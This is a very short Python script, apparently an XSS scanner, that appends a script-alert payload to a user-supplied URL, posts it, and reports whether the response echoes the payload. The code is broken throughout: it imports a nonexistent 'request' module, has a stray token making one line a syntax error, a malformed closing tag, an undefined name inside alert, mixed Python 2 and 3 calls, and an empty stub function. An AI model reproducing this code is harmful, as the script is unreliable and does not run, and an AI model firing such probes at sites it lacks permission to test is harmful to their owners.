import request


def check_vuln():
  target=raw_input("Url inject: ")
  payload="<script>alert(XSS);<script>"

  req=request.post(target + payload) dd

  if payload in req.text:
    print("XSS vulnerability discovered")
    print("Attacking payload : "+payload)
  else:
    print("Secure")
def code_inject():
  pass
    
    
if __name__=="__main__":
  check_vuln()
